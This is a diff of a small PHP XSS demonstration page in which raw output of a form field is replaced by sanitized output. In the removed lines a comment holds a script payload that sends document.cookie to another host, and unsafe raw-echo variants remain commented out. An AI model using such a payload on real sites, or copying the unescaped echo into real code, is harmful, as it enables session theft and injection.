@@ -1,29 +1,25 @@
 <?php
 
+session_start();
+
 /**
  * XSS(Cross Site Scripting).
  */
 switch ($_SERVER['REQUEST_METHOD']) {
     case 'GET':
-        if (array_key_exists('PHPSESSID', $_GET)) {
-            $_GET['PHPSESSID'];
-        } else {
-            echo <<<'HTML'
-        <form action="/" method="POST">
-            <textarea name="text" style="width: 320px; height: 320px; display: block;"></textarea>
-            <input type="submit">
-        </form>
+        echo <<<'HTML'
+<form action="/" method="POST">
+    <textarea name="content" rows=25 cols=50></textarea>
+    <input type="submit">
+</form>
 HTML;
-        }
         break;
     case 'POST':
-        /**
-         * <script>location.href="http://localhost/?" + document.cookie</script>.
-         */
-        if (array_key_exists('text', $_POST)) {
-            $content = $_POST['text'];
-            //  htmlentities($content);
-            //  filter_var($content, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
-        }
+        // echo $_POST['content'];
+        // echo htmlentities($_POST['content']);
+        // echo strip_tags($_POST['content']);
+        echo filter_input(INPUT_POST, 'content', FILTER_SANITIZE_FULL_SPECIAL_CHARS);
         break;
+    default:
+        http_response_code(404);
 }
